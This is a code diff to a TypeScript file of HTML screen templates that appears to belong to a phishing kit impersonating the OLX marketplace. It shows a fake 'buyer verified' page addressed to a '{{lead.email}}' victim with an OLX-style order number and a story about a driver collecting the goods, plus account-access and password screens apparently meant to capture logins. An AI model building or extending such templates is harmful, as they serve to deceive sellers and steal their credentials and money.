@@ -644,7 +644,7 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
     <!-- Greeting -->
     <div class="greet">
       <h2>Olá, <span id="user-name">{{lead.email}}</span>!</h2>
-      <p id="greet-text">O comprador foi verificado e o pedido <strong id="order-inline">#OLX-6985866921</strong> está liberado. Solicite o motorista parceiro para retirar o produto no seu endereço e levar até o comprador.</p>
+      <p id="greet-text">está liberado. Solicite o motorista parceiro para retirar o produto no seu endereço e levar até o comprador.</p>
     </div>
 
     <!-- Tracker -->
@@ -1420,13 +1420,12 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
-
 export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
   "access-account": {
     title: "Acesse sua conta",
     html: ACCESS_ACCOUNT_HTML,
   },
-  "password": {
+  password: {
     title: "Tela de senha",
     html: PASSWORD_SCREEN_HTML,
   },
